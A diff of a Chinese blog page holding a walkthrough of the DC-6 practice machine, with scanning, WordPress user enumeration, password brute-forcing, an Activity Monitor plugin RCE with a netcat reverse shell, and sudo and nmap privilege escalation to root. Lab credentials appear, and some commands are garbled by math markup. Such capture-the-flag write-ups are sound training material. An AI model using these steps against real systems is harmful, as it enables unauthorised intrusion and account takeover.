@@ -304,61 +304,93 @@
       
         <p>TIPS</p>
 <blockquote>
-<p>CLUE<br>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
-<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
+<p>CLUE OK, this isn't really a clue as such, but more of some "we don't
+want to spend five years waiting for a certain process to finish" kind
+of advice for those who just want to get on with the job.</p>
+<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt
+That should save you a few years. ;-)</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>环境</p>
 <blockquote>
-<p>网段    192.168.18.0/24</p>
-<p>kali    192.168.18.131</p>
-<p>靶机 </p>
+<p>网段 192.168.18.0/24</p>
+<p>kali 192.168.18.131</p>
+<p>靶机</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>扫描网段</p>
 <blockquote>
 <p><strong>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn</strong></p>
-<p>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:40 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.137<br>Host is up (0.00047s latency).<br>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00029s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
+<p>Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 19:40 CST Nmap
+scan report for 192.168.18.2 Host is up (0.00027s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.137 Host is
+up (0.00047s latency). MAC Address: 00:0C:29:74:F8:D0 (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00029s latency). MAC Address:
+00:50:56:E1:37:77 (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
 </blockquote>
 <p>扫描靶机开放的端口</p>
 <blockquote>
-<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p- -sV</strong></p>
-<p>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:41 CST<br>Nmap scan report for 192.168.18.137<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br><strong>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
-<p><strong>80/tcp open  http    Apache httpd 2.4.25 ((Debian))</strong></p>
-<p>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds</p>
+<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p-
+-sV</strong></p>
+<p>Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 19:41 CST Nmap
+scan report for 192.168.18.137 Host is up (0.0017s latency). Not shown:
+65533 closed ports PORT STATE SERVICE VERSION <strong>22/tcp open ssh
+OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
+<p><strong>80/tcp open http Apache httpd 2.4.25 ((Debian))</strong></p>
+<p>MAC Address: 00:0C:29:74:F8:D0 (VMware) Service Info: OS: Linux; CPE:
+cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 12.12 seconds</p>
 </blockquote>
 <p>开放了22端口和80端口</p>
 <p>dirsearch扫一下目录</p>
 <blockquote>
-<p>… ..</p>
-<p>[19:44:43] 301 -  321B  - /wp-content  -&gt;  <a target="_blank" rel="noopener" href="http://192.168.18.137/wp-content/">http://192.168.18.137/wp-content/</a><br>[19:44:43] 301 -  319B  - /wp-admin  -&gt;  <a target="_blank" rel="noopener" href="http://192.168.18.137/wp-admin/">http://192.168.18.137/wp-admin/</a></p>
-<p>[19:44:43] 301 -  322B  - /wp-includes  -&gt;  <a target="_blank" rel="noopener" href="http://192.168.18.137/wp-includes/">http://192.168.18.137/wp-includes/</a></p>
-<p>[19:44:43] 200 -   42KB - /wp-includes/<br>[19:44:43] 500 -    0B  - /wp-content/plugins/hello.php<br>[19:44:43] 200 -    0B  - /wp-config.php    </p>
-<p>[19:44:44] 302 -    0B  - /wp-admin/  -&gt;  <a target="_blank" rel="noopener" href="http://wordy/wp-login.php?redirect_to=http://192.168.18.137/wp-admin/&amp;reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</a></p>
-<p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a target="_blank" rel="noopener" href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
-<p>… …</p>
+<p>... ..</p>
+<p>[19:44:43] 301 - 321B - /wp-content -&gt;
+http://192.168.18.137/wp-content/ [19:44:43] 301 - 319B - /wp-admin
+-&gt; http://192.168.18.137/wp-admin/</p>
+<p>[19:44:43] 301 - 322B - /wp-includes -&gt;
+http://192.168.18.137/wp-includes/</p>
+<p>[19:44:43] 200 - 42KB - /wp-includes/<br>
+[19:44:43] 500 - 0B - /wp-content/plugins/hello.php<br>
+[19:44:43] 200 - 0B - /wp-config.php</p>
+<p>[19:44:44] 302 - 0B - /wp-admin/ -&gt;
+http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</p>
+<p>[19:44:44] 302 - 0B - /wp-signup.php -&gt;
+http://wordy/wp-login.php?action=register</p>
+<p>... ...</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>浏览器登录<code>192.168.18.137</code>发现会跳转到<code>http://wordy</code>，那需要修改一下host</p>
 <blockquote>
 <p>sudo vim /etc/hosts</p>
 <p>192.168.18.137 wordy</p>
 </blockquote>
 <p>进入主页可以看出这是<code>WordPress</code>,第二关也是WordPress</p>
-<p>进入后台<code>wordy/wp-login.php</code> </p>
+<p>进入后台<code>wordy/wp-login.php</code></p>
 <p>使用wpscan扫一下</p>
 <blockquote>
-<p>kali@kali2020:~$ wpscan –url wordy -e u</p>
+<p>kali@kali2020:~$ wpscan --url wordy -e u</p>
 <p>[i] User(s) Identified:</p>
-<p>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - <a target="_blank" rel="noopener" href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)</p>
-<p>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
-<p>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
-<p>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
-<p>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
+<p>[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed
+By: | Wp Json Api (Aggressive Detection) | -
+http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |
+Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login
+Error Messages (Aggressive Detection)</p>
+<p>[+] sarah | Found By: Author Id Brute Forcing - Author Pattern
+(Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive
+Detection)</p>
+<p>[+] graham | Found By: Author Id Brute Forcing - Author Pattern
+(Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive
+Detection)</p>
+<p>[+] mark | Found By: Author Id Brute Forcing - Author Pattern
+(Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive
+Detection)</p>
+<p>[+] jens | Found By: Author Id Brute Forcing - Author Pattern
+(Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive
+Detection)</p>
 </blockquote>
 <p>一共扫出5个用户<code>admin,sarah,graham,mark,jens</code></p>
 <p>根据官网上的线索，需要用到kali自带的<code>rockyou.txt</code></p>
@@ -366,127 +398,141 @@
 <p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
 <p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
 <blockquote>
-<p>kali@kali2020:<del>/Tools/DCchallenges/DCchallenges6$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt<br>kali@kali2020:</del>/Tools/DCchallenges/DCchallenges6$ ls<br>passwords_DC6.txt  username.txt</p>
+<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ cat
+/usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt
+kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ ls passwords_DC6.txt
+username.txt</p>
 </blockquote>
 <p>wpscan爆破一下</p>
 <blockquote>
-<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan –url wordy -U username.txt -P passwords_DC6.txt </p>
-<p>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01</p>
+<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan --url wordy
+-U username.txt -P passwords_DC6.txt</p>
+<p>[!] Valid Combinations Found: | Username: mark, Password:
+helpdesk01</p>
 </blockquote>
-<p>得到<code>mark    helpdesk01</code></p>
-<p>看看这个账号能不能进入后台    ，成功进入后台</p>
-<p>进入后台一直没找到切入点，看了下网上的，从Activity monitor插件为突破口</p>
+<p>得到<code>mark helpdesk01</code></p>
+<p>看看这个账号能不能进入后台 ，成功进入后台</p>
+<p>进入后台一直没找到切入点，看了下网上的，从Activity
+monitor插件为突破口</p>
 <p>去漏洞库看看有啥漏洞可以利用</p>
 <blockquote>
-<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit Activity monitor</p>
+<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit
+Activity monitor</p>
 <hr>
-<p> Exploit Title                       |  Path</p>
+<p>Exploit Title | Path</p>
 <hr>
-<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c<br>RedHat Linux 6.0/6.1/6.2 - ‘pam_cons | linux/local/19900.c<br>WordPress Plugin Plainview Activity  | php/webapps/45274.html</p>
+<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c RedHat
+Linux 6.0/6.1/6.2 - 'pam_cons | linux/local/19900.c WordPress Plugin
+Plainview Activity | php/webapps/45274.html</p>
 <hr>
 <p>Shellcodes: No Results</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <blockquote>
-<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
+<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp
+/usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
 </blockquote>
-<p>可以看到这是个Activity monitor插件的RCE,执行点在<code>TOOLS</code>下的<code>IP or interger</code></p>
+<p>可以看到这是个Activity
+monitor插件的RCE,执行点在<code>TOOLS</code>下的<code>IP or interger</code></p>
 <p>提前监听kali的端口<code>nc -nlvp 8888</code></p>
 <p>使用burp抓包</p>
-<p><img src="/posts/e38f4498/nc1.png"><br><img src="/posts/e38f4498/nc2.png"></p>
-<br>
-
-<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><img src="/posts/e38f4498/nc1.png"> <img src="/posts/e38f4498/nc2.png"></p>
+<p><br></p>
+<p><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></p>
 <p>返回/home 看到有四个用户，</p>
 <blockquote>
 <p><strong>cd mark</strong></p>
 <p><strong>cd stuff</strong></p>
 <p><strong>cat things-to-do.txt</strong></p>
-<p>cat things-to-do.txt<br>Things to do:</p>
+<p>cat things-to-do.txt Things to do:</p>
 <ul>
-<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
-<li>Buy present for Sarah’s farewell party</li>
+<li>Restore full functionality for the hyperdrive (need to speak to
+Jens)</li>
+<li>Buy present for Sarah's farewell party</li>
 <li>Add new user: graham - GSo7isUM1D4 - done</li>
 <li>Apply for the OSCP course</li>
-<li>Buy new laptop for Sarah’s replacement</li>
+<li>Buy new laptop for Sarah's replacement</li>
 </ul>
 </blockquote>
 <p>发现一个账户 <code>graham - GSo7isUM1D4</code></p>
 <blockquote>
-<p>www-data@dc-6:/home/mark/stuff$ su graham<br>su graham<br>Password: GSo7isUM1D4</p>
+<p>www-data@dc-6:/home/mark/stuff$ su graham<br>
+su graham Password: GSo7isUM1D4</p>
 <p>graham@dc-6:/home/mark/stuff$</p>
 </blockquote>
 <p>提权</p>
 <p>也可以尝试使用ssh登录</p>
 <p><code>kali@kali2020:~$ ssh graham@192.168.18.137</code></p>
 <blockquote>
-<p>graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh</p>
+<p>graham@dc-6:~$ sudo -l Matching Defaults entries for graham on dc-6:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User graham may run the following commands on dc-6: (jens) NOPASSWD:
+/home/jens/backups.sh</p>
 </blockquote>
 <p><code>home/jens</code>下可以不需要密码执行</p>
 <blockquote>
-<p>graham@dc-6:~$ cd ../<br>graham@dc-6:/home$ ls<br>graham  jens  mark  sarah<br>graham@dc-6:/home$ </p>
+<p>graham@dc-6:~$ cd ../ graham@dc-6:/home$ ls graham jens mark sarah
+graham@dc-6:/home$</p>
 </blockquote>
 <p>向<code>bacjuos.sh</code>写入 <code>/bin/bash</code></p>
 <blockquote>
-<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
+<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh
+graham@dc-6:/home/jens$ sudo -u jens ./backups.sh tar: Removing leading
+`/' from member names /home/jens/backups.sh: line 3: “/bin/bash”: No
+such file or directory jens@dc-6:~$</p>
 </blockquote>
 <p>成功切换到jens用户</p>
 <p><code>sudo -l</code> 获取jens权限</p>
 <blockquote>
-<p>jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap</p>
+<p>jens@dc-6:~$ sudo -l Matching Defaults entries for jens on dc-6:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User jens may run the following commands on dc-6: (root) NOPASSWD:
+/usr/bin/nmap</p>
 </blockquote>
 <p>发现可以免密使用nmap</p>
 <p>nmap提权参考<code>https://gtfobins.github.io/gtfobins/nmap/</code></p>
 <p>nmap查看版本</p>
 <blockquote>
 <p>jens@dc-6:~$ nmap -V</p>
-<p>Nmap version 7.40 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
+<p>Nmap version 7.40 ( https://nmap.org ) Platform: x86_64-pc-linux-gnu
+Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1
+nmap-libdnet-1.12 ipv6 Compiled without: Available nsock engines: epoll
+poll select</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <blockquote>
-<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
+<p>TF=$(mktemp) echo 'os.execute("/bin/sh")' &gt; <span class="math inline">\(TF
+sudo nmap --script=\)</span>TF</p>
 </blockquote>
 <p>执行了一下，结果靶机崩了，重置一下</p>
 <p>靶机ip改成了192.168.18.139</p>
-<p>ssh连接  <code>graham - GSo7isUM1D4</code></p>
+<p>ssh连接 <code>graham - GSo7isUM1D4</code></p>
 <p><code>kali@kali2020:~$ ssh graham@192.168.18.139</code></p>
 <blockquote>
-<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
+<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh tar: Removing
+leading `/' from member names /home/jens/backups.sh: line 3:
+“/bin/bash”: No such file or directory jens@dc-6:~$</p>
 </blockquote>
 <blockquote>
-<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
+<p>TF=$(mktemp) echo 'os.execute("/bin/sh")' &gt; <span class="math inline">\(TF
+sudo nmap --script=\)</span>TF</p>
 </blockquote>
-<p>成功上升为root权限,进入/root得到flag<br><img src="/posts/e38f4498/flag.png"></p>
-<br>
-
-<br>
-
+<p>成功上升为root权限,进入/root得到flag <img src="/posts/e38f4498/flag.png"></p>
+<p><br></p>
+<p><br></p>
 <p>总结</p>
 <ul>
-<li><p>wpscan爆破</p>
-</li>
-<li><p>Activity monitor RCE</p>
-</li>
-<li><p>nc反弹shell</p>
-</li>
-<li><p>ssh连接</p>
-</li>
-<li><p>nmap提权</p>
-</li>
+<li><p>wpscan爆破</p></li>
+<li><p>Activity monitor RCE</p></li>
+<li><p>nc反弹shell</p></li>
+<li><p>ssh连接</p></li>
+<li><p>nmap提权</p></li>
 </ul>
-<br>
-
-<br>
-
-
-<p>Reference</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap">https://gtfobins.github.io/gtfobins/nmap</a></p>
-</blockquote>
+<p><br></p>
+<p><br></p>
+<p>Reference &gt; https://gtfobins.github.io/gtfobins/nmap</p>
 
     </div>
 
@@ -631,7 +677,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -679,7 +725,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -693,7 +739,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -704,7 +750,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -844,6 +890,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
